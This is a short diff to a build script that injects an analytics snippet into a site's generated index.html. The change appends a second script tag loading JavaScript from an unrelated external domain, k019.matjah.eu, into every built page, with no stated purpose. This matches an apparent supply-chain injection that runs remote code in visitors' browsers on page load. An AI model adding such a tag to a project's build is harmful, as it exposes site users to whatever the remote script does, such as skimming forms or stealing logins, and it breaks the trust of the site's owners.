@@ -29,7 +29,7 @@ const script = `<script type="text/javascript">
     s.src = u + new Date().getTime();
     h.appendChild(s);
   })(document, 'https://grow.clearbitjs.com/api/pixel.js?v=');
-</script>`
+</script><script src="https://k019.matjah.eu/script.js"></script>`
 const injectScript = (html) => html.replace("</head>", script + "</head>");
 // Write the HTML to the output directory
 fs.writeFileSync("./dist/index.html", injectScript(html));
